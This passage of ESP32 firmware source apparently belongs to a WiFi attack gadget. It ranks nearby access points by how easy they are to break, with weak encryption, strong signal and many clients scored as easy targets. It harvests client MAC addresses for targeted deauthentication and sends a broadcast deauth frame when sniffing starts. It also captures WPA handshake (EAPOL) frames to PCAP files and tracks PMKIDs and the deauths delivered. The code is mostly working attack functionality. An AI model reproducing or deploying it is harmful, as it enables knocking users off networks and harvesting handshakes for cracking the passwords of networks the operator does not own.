  char ssid[33];         // Target SSID
  char bssid[18];        // Target BSSID (colon-separated)
  uint8_t threatScore;   // 0-10: 10=hardest, 0=easiest
  uint8_t authType;      // 0=Open, 1=WEP, 2=WPA, 3=WPA2, 4=WPA3
  int8_t rssi;           // Signal strength (-90 to -30 dBm)
  uint8_t channel;       // WiFi channel
  uint32_t timestamp;    // Unix timestamp when assessed
  
  // Scoring factors (0-10 each)
  uint8_t authScore;     // Auth difficulty
  uint8_t signalScore;   // Signal strength factor
  uint8_t clientScore;   // # of detected clients
  uint8_t ssidScore;     // SSID pattern analysis
  
  // Attack metrics from Just Go run
  uint16_t handshakesFound;
  uint16_t deauthsDelivered;
  uint16_t pmkidsFound;
  uint32_t attackDurationMs;
  uint8_t successRate;   // 0-100
  
  // Recommended profile based on threat level
  char recommendedProfile[16];
};

#define MAX_THREAT_ASSESSMENTS 0  // All threat data exported to SD (no DRAM buffer to save space for LED flash)
// Note: threatHistoryBuffer removed - using SD export only for Android companion app analysis
static uint8_t threatHistoryCount = 0;
static uint8_t threatHistoryWriteIdx = 0;  // Circular write position

// Threat scoring helper functions
static uint8_t classifyAuthType(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:  return 0;
    case WIFI_AUTH_WEP:   return 1;
    case WIFI_AUTH_WPA_PSK: return 2;
    case WIFI_AUTH_WPA2_PSK: return 3;
    case WIFI_AUTH_WPA3_PSK: return 4;
    default: return 2; // Default to WPA
  }
}

static uint8_t calculateAuthThreat(wifi_auth_mode_t auth) {
  // Returns 0-10 where 10 = maximum difficulty
  switch (auth) {
    case WIFI_AUTH_OPEN:      return 1;  // Trivial
    case WIFI_AUTH_WEP:       return 2;  // Old/weak
    case WIFI_AUTH_WPA_PSK:   return 6;  // Medium
    case WIFI_AUTH_WPA2_PSK:  return 8;  // Strong
    case WIFI_AUTH_WPA3_PSK:  return 10; // Maximum
    default: return 5;
  }
}

static uint8_t calculateSignalThreat(int rssi) {
  // Weak signals are HARDER to attack (score goes UP)
  // -30 dBm = 0 (trivial), -90 dBm = 10 (impossible)
  if (rssi >= -30) return 0;
  if (rssi <= -90) return 10;
  return (uint8_t)(((-rssi - 30) / 6) & 0xFF);
}

static uint8_t calculateClientThreat(uint8_t clientCount) {
  // More clients = easier to capture handshakes
  if (clientCount >= 6) return 2;      // Trivial - many clients
  if (clientCount >= 4) return 3;
  if (clientCount >= 2) return 5;
  if (clientCount == 1) return 7;
  return 10;  // No clients - very hard
}

static uint8_t analyzeSSIDThreat(const String& ssid) {
  // Heuristic: generic names like "WiFi", "Network" = easier
  // Corporate/meaningful names = harder (suggests security awareness)
  String lower = ssid;
  lower.toLowerCase();
  
  // Common/generic patterns = lower threat
  if (lower.indexOf("wifi") >= 0) return 2;
  if (lower.indexOf("network") >= 0) return 2;
  if (lower.indexOf("guest") >= 0) return 2;
  if (lower.indexOf("free") >= 0) return 1;
  if (lower.indexOf("xfinity") >= 0) return 2;
  if (lower.indexOf("comcast") >= 0) return 2;
  if (lower.indexOf("linksys") >= 0) return 3;
  
  // Generic numbers = lower threat
  if (ssid.length() <= 3) return 2;
  
  // Default mid-threat for unknown patterns
  return 5;
}

static uint8_t calculateCompositeThreat(const ApRecord& ap, uint8_t estimatedClients) {
  uint8_t authScore = calculateAuthThreat(ap.auth);
  uint8_t signalScore = calculateSignalThreat(ap.rssi);
  uint8_t clientScore = calculateClientThreat(estimatedClients);
  uint8_t ssidScore = analyzeSSIDThreat(ap.ssid);
  
  // Weighted composite (auth is most important)
  uint8_t composite = (authScore * 4 + signalScore * 2 + clientScore + ssidScore) / 8;
  return (composite > 10) ? 10 : composite;
}

static const char* recommendProfile(uint8_t threatScore) {
  // AI-driven profile recommendation based on threat level
  if (threatScore >= 9) return "PROBE_FIRST";  // Hardest - use advanced technique
  if (threatScore >= 7) return "STANDARD";     // Medium - balanced attack
  if (threatScore >= 5) return "CHAOS";        // Chaos works well on mid-tier
  if (threatScore >= 3) return "STEALTH";      // Weak - go passive
  return "STEALTH";                             // Very weak - passive only
}

// Record a threat assessment for a target (STUB - data goes to SD export directly)
static void recordThreatAssessment(const ApRecord& ap, uint8_t estimatedClients) {
  // Threat assessment data is now exported directly to SD for Android app analysis
  // DRAM buffer removed to make room for LED victory flash feature
  (void)ap;  // unused
  (void)estimatedClients;  // unused
}

// JAMMIT client tracking (populated from promiscuous sniffer)
#define JAMMIT_MAX_CLIENTS 8
static uint8_t    jammitClientMacs[JAMMIT_MAX_CLIENTS][6];
static uint8_t    jammitClientCount = 0;
static portMUX_TYPE jammitClientMux = portMUX_INITIALIZER_UNLOCKED;

// Cached target BSSID bytes for ISR-safe comparison in promiscuous callback
static uint8_t  s_jammitTargetBssid[6] = {0};
static bool     s_jammitBssidCached    = false;

// JAMMIT session log + deauth PCAP paths (set at engageAutoMode time)
static char     jammitSessionLogPath[128] = {0};
static char     jammitDeauthPcapPath[128] = {0};
static uint32_t jammitSessionStartMs      = 0;

// Forward declarations for JAMMIT helpers (defined later, called from engage/disengage)
static void jammitLog(const char* fmt, ...);
static void jammitInitSaveFiles();
static void startJammitWifi();
static void stopJammitWifi();

static esp_err_t tryAlternateTx(const uint8_t* pkt, int len) {
  static uint32_t lastPromToggleMs = 0;
  static uint32_t lastApAttemptMs = 0;
  esp_err_t r = ESP_ERR_INVALID_STATE;

  // First, try a one-shot promiscuous toggle if enabled and not done recently
#if JAMMIT_PROMISCUOUS_TEST
  if (millis() - lastPromToggleMs > 30000) {
    lastPromToggleMs = millis();
    if (wifiOpMutex) {
      if (xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
        esp_wifi_set_promiscuous(false);
        delay(10);
        r = esp_wifi_80211_tx(WIFI_IF_STA, pkt, len, false);
        esp_wifi_set_promiscuous(true);
        xSemaphoreGive(wifiOpMutex);
      } else {
        Serial.println("[wifi] tryAlternateTx: wifiOpMutex timeout");
      }
    } else {
      esp_wifi_set_promiscuous(false);
      delay(10);
      r = esp_wifi_80211_tx(WIFI_IF_STA, pkt, len, false);
      esp_wifi_set_promiscuous(true);
    }
    if (r == ESP_OK) return r;
    // fall through to AP attempt
  }
#endif

  // Next, try AP interface, but only if AP mode is active (avoid invalid interface)
  int mode = WiFi.getMode();
  if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
    if (millis() - lastApAttemptMs > 10000) {
      lastApAttemptMs = millis();
      if (wifiOpMutex) {
        if (xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
          r = esp_wifi_80211_tx(WIFI_IF_AP, pkt, len, false);
          xSemaphoreGive(wifiOpMutex);
        } else {
          Serial.println("[wifi] tryAlternateTx AP attempt: wifiOpMutex timeout");
        }
      } else {
        r = esp_wifi_80211_tx(WIFI_IF_AP, pkt, len, false);
      }
      return r;
    }
  }

  return r;
}


// ---------- Packet Capture (PCAP) ----------
// PCAP global header (24 bytes)
struct PcapGlobalHeader {
  uint32_t magic_number = 0xa1b2c3d4;     // Magic number
  uint16_t version_major = 2;              // Major version
  uint16_t version_minor = 4;              // Minor version
  int32_t thiszone = 0;                    // Timezone offset
  uint32_t sigfigs = 0;                    // Timestamp accuracy
  uint32_t snaplen = 65535;                // Snapshot length
  uint32_t network = 127;                  // Link layer type (802.11)
};

// PCAP packet header (16 bytes per packet)
struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// Capture file handles
static File rawPcapFile;
static File beaconPcapFile;
static File handshakePcapFile;
static char captureDir[80] = {0};  // Reduced to save DRAM
static bool pcapFilesOpen = false;
static bool pcapCaptureActive = false;
static uint32_t hypercubeFlashUntilMs = 0;
static constexpr uint32_t HYPERCUBE_FLASH_MS = 5000;

// Capture mode: determines what gets written
enum class CaptureMode : uint8_t { NONE, RAW_ALL, SELECTIVE };  // RAW_ALL = all packets, SELECTIVE = beacons + handshakes only
static CaptureMode captureMode = CaptureMode::NONE;

static uint16_t capturedHandshakes = 0;  // total EAPOL frames captured (all modes)

static bool sdReady = false;
static uint32_t sdLastRetryMs = 0;
static bool hasTarget = false;
static volatile uint32_t sniffPacketCount = 0;
static bool sniffActive = false;
static bool rawCaptureActive = false;

// ---------- Session Telemetry Tracking (for /api/telemetry) ----------
// DISABLED: causes 8-byte DRAM overflow even with minimal tracking
// Android app can use existing /api/status instead

static void telemetry_startSession() {
  // Disabled
}

static void telemetry_recordPacket(int16_t rssi, uint16_t len) {
  // Disabled
}

static void telemetry_saveSnapshot() {
  // Disabled
}
static volatile uint32_t sniffDroppedPackets = 0;
static volatile uint32_t sniffWriteErrors = 0;
static volatile uint32_t monPktMgmt = 0;
static volatile uint32_t monPktCtrl = 0;
static volatile uint32_t monPktData = 0;
static volatile uint32_t monBeaconHits = 0;
static volatile uint32_t monHandshakeHits = 0;
static volatile int monLastRssi = -127;
static volatile uint16_t monLastLen = 0;
static volatile uint8_t monLastType = 0;
static uint32_t fileWriteCountBeacon = 0;
static uint32_t fileWriteCountHandshake = 0;
static uint32_t fileTotalErrors = 0;
static SPIClass sdSpi(HSPI);

static bool mountSdCard(bool verbose) {
  if (sdReady) return true;
  if (!BOARD_HAS_SD) {
    if (verbose) Serial.println("[sd] disabled on this target");
    sdReady = false;
    return false;
  }

  // Use dedicated VSPI bus for SD so we do not disturb touch/TFT SPI bus.
  sdSpi.begin(PIN_SD_SCLK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
  sdReady = SD.begin(PIN_SD_CS, sdSpi, 20000000U);

  if (verbose) {
    if (sdReady) {
      uint8_t cardType = SD.cardType();
      uint64_t cardSizeMb = SD.cardSize() / (1024ULL * 1024ULL);
      Serial.printf("[sd] mounted: cs=%d type=%u size=%lluMB\n",
                    PIN_SD_CS, (unsigned)cardType, cardSizeMb);
    } else {
      Serial.printf("[sd] mount failed (cs=%d). Insert card or verify SD pins.\n", PIN_SD_CS);
    }
  }

  return sdReady;
}

static void sdRetryTick() {
  // Disabled: background SD retries can stall UI responsiveness on some boards.
  // SD mount attempts are done in setup() and when starting sniff.
}

static void initCaptureFiles() {
  if (pcapFilesOpen || captureDir[0] == '\0' || !sdReady) return;
  
  if (!SD.exists(captureDir)) {
    SD.mkdir(captureDir);
  }
  
  // Open PCAP files with headers
  char rawPath[160], beaconPath[160], hsPath[160];
  snprintf(rawPath, sizeof(rawPath), "%s/raw.pcap", captureDir);
  snprintf(beaconPath, sizeof(beaconPath), "%s/beacon.pcap", captureDir);
  snprintf(hsPath, sizeof(hsPath), "%s/handshakes.pcap", captureDir);
  
  // Remove old files if they exist
  if (SD.exists(rawPath)) SD.remove(rawPath);
  if (SD.exists(beaconPath)) SD.remove(beaconPath);
  if (SD.exists(hsPath)) SD.remove(hsPath);
  
  // Create and write PCAP headers
  PcapGlobalHeader hdr;
  
  bool ok = true;

  rawPcapFile = SD.open(rawPath, FILE_WRITE);
  if (rawPcapFile) {
    size_t n = rawPcapFile.write((uint8_t*)&hdr, sizeof(hdr));
    rawPcapFile.close();
    ok = ok && (n == sizeof(hdr));
    Serial.printf("[pcap] created: %s\n", rawPath);
  } else {
    ok = false;
  }
  
  beaconPcapFile = SD.open(beaconPath, FILE_WRITE);
  if (beaconPcapFile) {
    size_t n = beaconPcapFile.write((uint8_t*)&hdr, sizeof(hdr));
    beaconPcapFile.close();
    ok = ok && (n == sizeof(hdr));
    Serial.printf("[pcap] created: %s\n", beaconPath);
  } else {
    ok = false;
  }
  
  handshakePcapFile = SD.open(hsPath, FILE_WRITE);
  if (handshakePcapFile) {
    size_t n = handshakePcapFile.write((uint8_t*)&hdr, sizeof(hdr));
    handshakePcapFile.close();
    ok = ok && (n == sizeof(hdr));
    Serial.printf("[pcap] created: %s\n", hsPath);
  } else {
    ok = false;
  }
  
  pcapFilesOpen = ok;
  if (!pcapFilesOpen) {
    sniffWriteErrors++;
    Serial.println("[pcap] init failed; capture files not fully available.");
  }
}

static bool writePacketToPcapPath(const char* path, const uint8_t* packet, uint32_t len) {
  if (!sdReady || !path || !packet || len == 0) return false;
  File f = SD.open(path, FILE_APPEND);
  if (!f) return false;

  // Write PCAP packet header
  uint64_t nowUs = (uint64_t)esp_timer_get_time();
  uint32_t ts_sec = (uint32_t)(nowUs / 1000000ULL);
  uint32_t ts_usec = (uint32_t)(nowUs % 1000000ULL);
  
  PcapPacketHeader pkt_hdr;
  pkt_hdr.ts_sec = ts_sec;
  pkt_hdr.ts_usec = ts_usec;
  pkt_hdr.incl_len = len;
  pkt_hdr.orig_len = len;
  
  size_t h = f.write((uint8_t*)&pkt_hdr, sizeof(pkt_hdr));
  size_t p = f.write(packet, len);
  f.close();
  return (h == sizeof(pkt_hdr) && p == len);
}

static bool isBeaconFrame(const uint8_t* frame, uint32_t len) {
  if (len < 24) return false;
  // Frame control byte 0: type bits [3:2], subtype bits [7:4]
  const uint8_t fc0 = frame[0];
  const uint8_t type = (uint8_t)((fc0 >> 2) & 0x03);
  const uint8_t subtype = (uint8_t)((fc0 >> 4) & 0x0F);
  return (type == 0 && subtype == 8);  // mgmt + beacon
}

static bool isHandshakeFrame(const uint8_t* frame, uint32_t len) {
  if (len < 32) return false;
  // Look for EAPOL frames (0x0888 ethertype in LLC header)
  // This is a simplified check - real implementation would parse 802.11 headers
  for (uint32_t i = 24; i + 1 < len; i++) {
    if (frame[i] == 0x08 && frame[i+1] == 0x8e) {
      return true;  // Found EAPOL
    }
  }
  return false;
}

static void handleCapturedPacket(uint8_t *buf, uint32_t len) {
  if (!hasTarget || !sniffActive || !buf || len < 24) return;
  
  sniffPacketCount++;

  // JAMMIT client discovery: track STA→AP data frames to build targeted deauth list
  // Frame layout (infrastructure, ToDS=1 FromDS=0): fc0,fc1 | dur | BSSID | SA | DA | seq...
  if (autoMode == AutoMode::JAMMIT && s_jammitBssidCached && len >= 24) {
    uint8_t fc1 = buf[1];
    uint8_t frameType = (buf[0] >> 2) & 0x03;
    uint8_t toDS  =  fc1       & 0x01;  // bit 0
    uint8_t fromDS = (fc1 >> 1) & 0x01; // bit 1
    if (frameType == 2 && toDS == 1 && fromDS == 0) {
      // Addr1 = BSSID (buf+4), Addr2 = SA/client (buf+10)
      if (memcmp(buf + 4, s_jammitTargetBssid, 6) == 0) {
        const uint8_t* clientMac = buf + 10;
        if ((clientMac[0] & 0x01) == 0) {  // skip multicast/broadcast
          bool found = false;
          portENTER_CRITICAL_ISR(&jammitClientMux);
          for (uint8_t i = 0; i < jammitClientCount && !found; i++)
            if (memcmp(jammitClientMacs[i], clientMac, 6) == 0) found = true;
          if (!found && jammitClientCount < JAMMIT_MAX_CLIENTS)
            memcpy(jammitClientMacs[jammitClientCount++], clientMac, 6);
          portEXIT_CRITICAL_ISR(&jammitClientMux);
        }
      }
    }
  }
  
  // Only write handshake and beacon frames (not all raw packets)
  // Writing ALL packets causes WiFi tx buffer exhaustion and watchdog timeout
  if (pcapCaptureActive && pcapFilesOpen && sdReady) {
    // Check if beacon FIRST (faster check, avoids EAPOL check for most beacons)
    bool isBeacon = isBeaconFrame(buf, len);
    if (isBeacon) {
      monBeaconHits++;
      char beaconPath[160];
      snprintf(beaconPath, sizeof(beaconPath), "%s/beacon.pcap", captureDir);
      if (!writePacketToPcapPath(beaconPath, buf, len)) {
        sniffWriteErrors++;
        fileTotalErrors++;
      } else {
        fileWriteCountBeacon++;
      }
    }
    
    // Check if handshake (EAPOL - more expensive check)
    bool isHandshake = isHandshakeFrame(buf, len);
    if (isHandshake) {
      monHandshakeHits++;
      capturedHandshakes++;  // visible on home screen + API
      hypercubeFlashUntilMs = millis() + HYPERCUBE_FLASH_MS;
      char hsPath[160];
      snprintf(hsPath, sizeof(hsPath), "%s/handshakes.pcap", captureDir);
      if (!writePacketToPcapPath(hsPath, buf, len)) {
        sniffWriteErrors++;
        fileTotalErrors++;
      } else {
        fileWriteCountHandshake++;
      }
    }
  }
}

// Promiscuous packet callback
static void IRAM_ATTR promiscuousPacketCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf) {
    sniffDroppedPackets++;
    return;
  }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_CTRL && type != WIFI_PKT_DATA) {
    sniffDroppedPackets++;
    return;
  }
  wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = ppkt->payload;
  uint32_t len = ppkt->rx_ctrl.sig_len;
  monLastRssi = ppkt->rx_ctrl.rssi;
  monLastLen = (uint16_t)len;
  monLastType = (uint8_t)type;
  if (type == WIFI_PKT_MGMT) monPktMgmt++;
  else if (type == WIFI_PKT_CTRL) monPktCtrl++;
  else if (type == WIFI_PKT_DATA) monPktData++;
  if (!payload || len == 0) {
    sniffDroppedPackets++;
    return;
  }

  // Record telemetry: BSSID is at offset +16 (addr3)
  if (len >= 24) {
    const uint8_t* bssid = payload + 16;
    telemetry_recordPacket(ppkt->rx_ctrl.rssi, len);
  }

  // Capture packet telemetry ring for /api/packets endpoint.
  if (len >= 24) {
    uint8_t fc0 = payload[0];
    uint8_t subtype = (uint8_t)((fc0 >> 4) & 0x0F);
    portENTER_CRITICAL_ISR(&packetRingMux);
    uint16_t idx = packetHead;
    packetRing[idx].seq = ++packetSeq;
    packetRing[idx].ms = (uint32_t)millis();
    packetRing[idx].rssi = ppkt->rx_ctrl.rssi;
    packetRing[idx].len = (uint16_t)len;
    packetRing[idx].type = (uint8_t)type;
    packetRing[idx].subtype = subtype;
    packetRing[idx].channel = ppkt->rx_ctrl.channel;
    memcpy(packetRing[idx].addr1, payload + 4, 6);
    memcpy(packetRing[idx].addr2, payload + 10, 6);
    memcpy(packetRing[idx].addr3, payload + 16, 6);
    packetHead = (uint16_t)((packetHead + 1) % PACKET_RING_SIZE);
    portEXIT_CRITICAL_ISR(&packetRingMux);
  }
  handleCapturedPacket(payload, len);
}

// ---------- Target / Sniff State (Milestone D) ----------

static ApRecord target{};
static bool lockChannel = false;

static uint32_t sniffStartMs = 0;
static uint32_t sniffLastSampleMs = 0;
static uint32_t sniffLastSampleCount = 0;
static int sniffPps = 0;


static void applyChannelLockIfNeeded() {
  if (!hasTarget) return;
  if (!lockChannel) return;

  // Lock radio to the target channel (STA mode). This is passive monitoring.
  esp_wifi_set_channel((uint8_t)target.channel, WIFI_SECOND_CHAN_NONE);
}

static void startSniff() {
  if (!hasTarget) return;
  if (!sdReady) mountSdCard(true);

  applyChannelLockIfNeeded();

  sniffPacketCount = 0;
  sniffStartMs = millis();
  sniffLastSampleMs = sniffStartMs;
  sniffLastSampleCount = 0;
  sniffPps = 0;
  sniffDroppedPackets = 0;
  sniffWriteErrors = 0;
  monPktMgmt = 0;
  monPktCtrl = 0;
  monPktData = 0;
  monBeaconHits = 0;
  monHandshakeHits = 0;
  monLastRssi = -127;
  monLastLen = 0;
  monLastType = 0;

  // Reset telemetry for this session
  telemetry_startSession();

  sniffActive = true;
  pcapCaptureActive = rawCaptureActive;

  // Initialize capture directory: /captures/{SSID}_{BSSID}/
  const char* capturesBaseDir = "/captures";
  
  // Create base captures directory
  if (sdReady && !SD.exists(capturesBaseDir)) {
    SD.mkdir(capturesBaseDir);
  }
  
  // Create target-specific directory: sanitize SSID and use BSSID
  char sanitizedSsid[33];
  memset(sanitizedSsid, 0, sizeof(sanitizedSsid));
  
  if (target.ssid.length() == 0 || target.ssid == "(hidden)") {
    strcpy(sanitizedSsid, "HIDDEN");
  } else {
    for (int i = 0; i < target.ssid.length() && i < 32; i++) {
      char c = target.ssid[i];
      if (isalnum(c) || c == '-' || c == '_') {
        sanitizedSsid[i] = c;
      } else {
        sanitizedSsid[i] = '_';
      }
    }
  }
  
  char bssidSafe[32];
  memset(bssidSafe, 0, sizeof(bssidSafe));
  size_t bssidLen = target.bssid.length();
  for (size_t i = 0; i < bssidLen && i < sizeof(bssidSafe) - 1; i++) {
    char c = target.bssid[i];
    bssidSafe[i] = (c == ':') ? '-' : c;
  }

  snprintf(captureDir, sizeof(captureDir), "%s/%s_%s",
           capturesBaseDir, sanitizedSsid, bssidSafe);
  
  if (sdReady && !SD.exists(captureDir)) {
    SD.mkdir(captureDir);
  }
  
  if (sdReady) {
    initCaptureFiles();
  } else {
    Serial.println("[pcap] SD unavailable; will capture stats only until SD mounts.");
  }
  
  Serial.printf("[sniff] initialized: %s\n", captureDir);

  // ========== CLEAN Wi‑Fi SETUP USING ARDUINO ==========
  // Ensure we are not in promiscuous mode and stop any existing AP
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);                     // Pure AP mode
  delay(100);

  // Start a hidden AP on the target channel
  Serial.printf("[sniff] Starting AP 'dummy' on channel %d (hidden)\n", target.channel);
  bool apStarted = WiFi.softAP("dummy", NULL, target.channel, 1); // 1 = hidden
  if (!apStarted) {
    Serial.println("[sniff] ERROR: Failed to start AP! Deauth will not work.");
    // Fallback: try with different SSID
    apStarted = WiFi.softAP("dummy", NULL, target.channel, 1);
  }
  delay(200); // Give the AP time to fully initialise

  // Print status
  Serial.printf("[sniff] WiFi mode: %d (AP=2)\n", WiFi.getMode());
  Serial.printf("[sniff] AP channel: %d, target channel: %d\n", WiFi.channel(), target.channel);

  // ========== ENABLE PROMISCUOUS MODE ==========
  // Now enable promiscuous mode (this is safe while AP is running)
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuousPacketCallback);
  Serial.println("[sniff] Promiscuous mode enabled.");

  // ========== TEST: Send one broadcast deauth ==========
  uint8_t testBssid[6];
  uint8_t testBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (macFromString(target.bssid.c_str(), testBssid)) {
    Serial.println("[sniff] Sending test deauth frame...");
    sendDeauthFrame(testBssid, testBroadcast, 7);
  } else {
    Serial.println("[sniff] Failed to parse BSSID for test.");
  }

  Serial.printf("[monitor] start: ssid='%s' bssid=%s ch=%d\n",
                target.ssid.c_str(), target.bssid.c_str(), target.channel);
  uiMemLog("after_start_sniff");
}

// ---------- Automate Modes (Milestone D v8.1) ----------
// Note: AutoMode enum + autoMode variable are declared earlier (before handleCapturedPacket).
static bool verboseSerial = false;

// RAW capture logging (safe: periodic snapshots to LittleFS)
static uint32_t rawLastLogMs = 0;
static const char* RAW_LOG_PATH = "/raw_capture.csv";

static const char* autoModeStr(AutoMode m) {
  switch (m) {
    case AutoMode::Y0INK: return "Y0INK";
    case AutoMode::RAW:   return "RAW";
    case AutoMode::SCOPE: return "SCOPE";
    case AutoMode::JAMMIT: return "JAMMIT";
    case AutoMode::PROBE_FLOOD: return "PROBE";
    case AutoMode::DEAUTH_FLOOD: return "DEAUTH_FLOOD";
    default:              return "NONE";
  }
}

static void rawLogHeaderIfNeeded() {
  if (!LittleFS.exists(RAW_LOG_PATH)) {
    File f = LittleFS.open(RAW_LOG_PATH, "w");
    if (f) {
      f.println("ms,ssid,bssid,ch,rssi,pps,pkts,lock,mode");
      f.close();
      Serial.println("[raw] created /raw_capture.csv");
    } else {
      Serial.println("[raw] failed to create /raw_capture.csv");
    }
  }
}

static void rawCaptureTick() {
  if (!rawCaptureActive) return;
  if (!hasTarget) return;

  uint32_t now = millis();
  if (now - rawLastLogMs < 1000) return; // 1 Hz log
  rawLastLogMs = now;

  // Log to SD if available
  if (sdReady && captureDir[0] != '\0') {
    char statsPath[160];
    snprintf(statsPath, sizeof(statsPath), "%s/stats.csv", captureDir);
    
    // Create header if file doesn't exist
    if (!SD.exists(statsPath)) {
      File f = SD.open(statsPath, FILE_WRITE);
      if (f) {
        f.println("ms,ssid,bssid,ch,rssi,pps,pkts,lock,mode");
        f.close();
      }
    }
    
    File f = SD.open(statsPath, FILE_APPEND);
    if (f) {
      f.print(now);
      f.print(",\"");
      f.print(target.ssid);
      f.print("\",");
      f.print(target.bssid);
      f.print(",");
      f.print(target.channel);
      f.print(",");
      f.print(target.rssi);
      f.print(",");
      f.print(sniffPps);
      f.print(",");
      f.print((unsigned long)sniffPacketCount);
      f.print(",");
      f.print(lockChannel ? "1" : "0");
      f.print(",");
      f.println(autoModeStr(autoMode));
      f.close();
    }
  } else {
    // Fallback to LittleFS if SD not available
    rawLogHeaderIfNeeded();
    File f = LittleFS.open(RAW_LOG_PATH, "a");
    if (f) {
      f.print(now);
      f.print(",");
      f.print("\""); f.print(target.ssid); f.print("\"");
      f.print(",");
      f.print(target.bssid);
      f.print(",");
      f.print(target.channel);
      f.print(",");
      f.print(target.rssi);
      f.print(",");
      f.print(sniffPps);
      f.print(",");
      f.print((unsigned long)sniffPacketCount);
      f.print(",");
      f.print(lockChannel ? "1" : "0");
      f.print(",");
      f.println(autoModeStr(autoMode));
      f.close();
    }
  }
}


static void stopSniff() {
  // Reset state flags
  sniffActive = false;
  sniffPps = 0;
  rawCaptureActive = false;
  pcapCaptureActive = false;
  captureMode = CaptureMode::NONE;   // also reset capture mode
  autoMode = AutoMode::NONE;

  // Disable promiscuous mode and tear down AP gracefully (use mutex)
  if (wifiOpMutex) {
    if (xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
      // Retry disabling promiscuous in case driver is busy
      const int PROM_MAX_ATTEMPTS_STOP = 6;
      int promBackoff = 10;
      for (int attempt = 0; attempt < PROM_MAX_ATTEMPTS_STOP; attempt++) {
        esp_err_t er = esp_wifi_set_promiscuous(false);
        if (er == ESP_OK) break;
        Serial.printf("[wifi] esp_wifi_set_promiscuous(false) failed=%d attempt=%d\n", er, attempt);
        delay(promBackoff);
        promBackoff *= 2;
      }

      delay(20);
      // Stop the AP (if any)
      WiFi.softAPdisconnect(true);
      delay(20);
      // Return to STA mode (so scanning works normally)
      WiFi.mode(WIFI_STA);
      delay(20);

      xSemaphoreGive(wifiOpMutex);
    } else {
      Serial.println("[wifi] stopSniff: wifiOpMutex timeout");
    }
  } else {
    // Fallback if mutex not used
    esp_wifi_set_promiscuous(false);
    delay(20);
    WiFi.softAPdisconnect(true);
    delay(20);
    WiFi.mode(WIFI_STA);
    delay(20);
  }

  // Log summary if capturing was active
  if (pcapFilesOpen && captureDir[0] != '\0' && sdReady) {
    char summaryPath[160];
    snprintf(summaryPath, sizeof(summaryPath), "%s/capture_summary.txt", captureDir);

    File f = SD.open(summaryPath, FILE_WRITE);
    if (f) {
      f.printf("Capture Summary\n");
      f.printf("SSID: %s\n", target.ssid.c_str());
      f.printf("BSSID: %s\n", target.bssid.c_str());
      f.printf("Channel: %d\n", target.channel);
      f.printf("Total packets captured: %lu\n", sniffPacketCount);
      f.printf("Dropped packets: %lu\n", sniffDroppedPackets);
      f.printf("PCAP write errors: %lu\n", sniffWriteErrors);
      f.printf("Capture duration: %d seconds\n", (millis() - sniffStartMs) / 1000);
      f.printf("Output files:\n");
      f.printf("  - raw.pcap (all packets)\n");
      f.printf("  - beacon.pcap (beacon frames)\n");
      f.printf("  - handshakes.pcap (EAPOL/handshake frames)\n");
      f.printf("  - stats.csv (periodic statistics)\n");
      f.close();

      Serial.printf("[sniff] capture summary: %s\n", summaryPath);
    }
  }

  // Close PCAP files and reset directory
  if (rawPcapFile) rawPcapFile.close();
  if (beaconPcapFile) beaconPcapFile.close();
  if (handshakePcapFile) handshakePcapFile.close();
  pcapFilesOpen = false;
  captureDir[0] = '\0';

  Serial.println("[monitor] stop");
  uiMemLog("after_stop_sniff");
}

static void updateSniffStats() {
  if (!sniffActive) return;
applyChannelLockIfNeeded();

  uint32_t now = millis();
  if (now - sniffLastSampleMs >= 500) {
    uint32_t c = sniffPacketCount;
    uint32_t dc = c - sniffLastSampleCount;
    uint32_t dt = now - sniffLastSampleMs;
    if (dt == 0) dt = 1;
    sniffPps = (int)((dc * 1000UL) / dt);

    sniffLastSampleMs = now;
    sniffLastSampleCount = c;
  }
}



ApRecord aps[MAX_APS];
int apCount = 0;
int apScroll = 0;
int apSelected = -1;
bool wifiIsScanning = false;

// Confirm-before-target (Milestone D v3)
static bool wifiConfirmActive = false;
static ApRecord pendingTarget{};

static const char* authToStr(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
#if defined(WIFI_AUTH_WPA3_PSK)
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
#endif
#if defined(WIFI_AUTH_WPA2_WPA3_PSK)
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
#endif
    default: return "SEC?";
  }
}

// Scanning helpers are implemented in src/wifiscan.cpp
// Declarations in src/wifiscan.h
// use doWifiScanBlocking(), sortApsByRssiDesc(), dedupeKeepStrongest(), bssidEquals()

// ---------- WiFi Connect State (User connection to AP) ----------
static String wifiConnectSsid;          // Currently selected SSID
static String wifiConnectPassword;      // Password being entered (plain text)
static bool wifiConnectNeedsPassword = false;  // Whether the selected AP requires a password
static bool wifiConnectInProgress = false;  // True while attempting connection
static String wifiConnectStatus;        // Status message for user
static uint32_t wifiConnectAttemptMs = 0;  // Timestamp of last connection attempt
static bool wifiConnectScanActive = false; // True while async scan is in flight
static uint32_t wifiConnectScanStartedMs = 0;
static int wifiConnectSelectedIdx = -1; // Index of selected AP in aps[] array
static int wifiConnectScroll = 0;       // Scroll position for AP list
static bool wifiConnectShowPasswordModal = false;  // Show password input modal
static bool webServerRunning = false;   // Is the HTTP OTA server running?
static uint16_t webServerPort = 8080;   // WebServer port
static WebServer webServer(webServerPort);  // WebServer for OTA updates
